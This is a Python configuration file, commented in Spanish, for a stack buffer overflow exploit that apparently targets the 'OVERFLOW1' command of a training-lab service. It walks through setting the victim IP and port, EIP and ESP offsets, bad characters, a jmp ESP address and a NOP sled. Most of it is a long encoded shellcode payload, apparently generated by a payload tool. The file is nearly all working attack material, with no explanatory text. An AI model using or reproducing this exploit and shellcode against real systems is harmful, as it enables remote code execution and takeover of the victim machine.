# PASO I
# ip máquina victima
rhost = ''

# puerto máquina victima
rport = 0

# timeout conexión en segundos
timeout = 10

# prefijo de opción
prefix = b'OVERFLOW1 '

# PASO II
# pattern
pattern = b''

# PASO III
# offset EIP
offsetEIP = 0

# offset ESP
offsetESP = offsetEIP + 4

# tamaño máximo del relleno de padding final
buffer = 2000

# PASO IV
badchars = [] # badchars = [0x00, 0x0a, 0x0d]
badcharsSequence = bytes(c for c in range(256) if c not in badchars)

# PASO V
# dirección de la operación jmp ESP
jmpESP = 0x11223344 # jmpESP = 0x11223344

# PASO VI
# subir ESP en la pila (stack)
#upESP = b'\x83\xec\x10'
upESP = b'\x90' * 16

# shellcode
shellcode =  b""
shellcode += b"\xfc\xbb\x43\x0c\x11\xdc\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\xbf\xe4\x93\xdc\x3f\xf5\xf3\x55"
shellcode += b"\xda\xc4\x33\x01\xaf\x77\x84\x41\xfd\x7b\x6f"
shellcode += b"\x07\x15\x0f\x1d\x80\x1a\xb8\xa8\xf6\x15\x39"
shellcode += b"\x80\xcb\x34\xb9\xdb\x1f\x96\x80\x13\x52\xd7"
shellcode += b"\xc5\x4e\x9f\x85\x9e\x05\x32\x39\xaa\x50\x8f"
shellcode += b"\xb2\xe0\x75\x97\x27\xb0\x74\xb6\xf6\xca\x2e"
shellcode += b"\x18\xf9\x1f\x5b\x11\xe1\x7c\x66\xeb\x9a\xb7"
shellcode += b"\x1c\xea\x4a\x86\xdd\x41\xb3\x26\x2c\x9b\xf4"
shellcode += b"\x81\xcf\xee\x0c\xf2\x72\xe9\xcb\x88\xa8\x7c"
shellcode += b"\xcf\x2b\x3a\x26\x2b\xcd\xef\xb1\xb8\xc1\x44"
shellcode += b"\xb5\xe6\xc5\x5b\x1a\x9d\xf2\xd0\x9d\x71\x73"
shellcode += b"\xa2\xb9\x55\xdf\x70\xa3\xcc\x85\xd7\xdc\x0e"
shellcode += b"\x66\x87\x78\x45\x8b\xdc\xf0\x04\xc4\x11\x39"
shellcode += b"\xb6\x14\x3e\x4a\xc5\x26\xe1\xe0\x41\x0b\x6a"
shellcode += b"\x2f\x96\x6c\x41\x97\x08\x93\x6a\xe8\x01\x50"
shellcode += b"\x3e\xb8\x39\x71\x3f\x53\xb9\x7e\xea\xf4\xe9"
shellcode += b"\xd0\x45\xb5\x59\x91\x35\x5d\xb3\x1e\x69\x7d"
shellcode += b"\xbc\xf4\x02\x14\x47\x9f\x26\xe0\x92\xa4\x5f"
shellcode += b"\xf0\x1c\x5c\xdf\x7d\xfa\x08\x0f\x28\x55\xa5"
shellcode += b"\xb6\x71\x2d\x54\x36\xac\x48\x56\xbc\x43\xad"
shellcode += b"\x19\x35\x29\xbd\xce\xb5\x64\x9f\x59\xc9\x52"
shellcode += b"\xb7\x06\x58\x39\x47\x40\x41\x96\x10\x05\xb7"
shellcode += b"\xef\xf4\xbb\xee\x59\xea\x41\x76\xa1\xae\x9d"
shellcode += b"\x4b\x2c\x2f\x53\xf7\x0a\x3f\xad\xf8\x16\x6b"
shellcode += b"\x61\xaf\xc0\xc5\xc7\x19\xa3\xbf\x91\xf6\x6d"
shellcode += b"\x57\x67\x35\xae\x21\x68\x10\x58\xcd\xd9\xcd"
shellcode += b"\x1d\xf2\xd6\x99\xa9\x8b\x0a\x3a\x55\x46\x8f"
shellcode += b"\x5a\xb4\x42\xfa\xf2\x61\x07\x47\x9f\x91\xf2"
shellcode += b"\x84\xa6\x11\xf6\x74\x5d\x09\x73\x70\x19\x8d"
shellcode += b"\x68\x08\x32\x78\x8e\xbf\x33\xa9\x8e\x3f\xcc"
shellcode += b"\x52"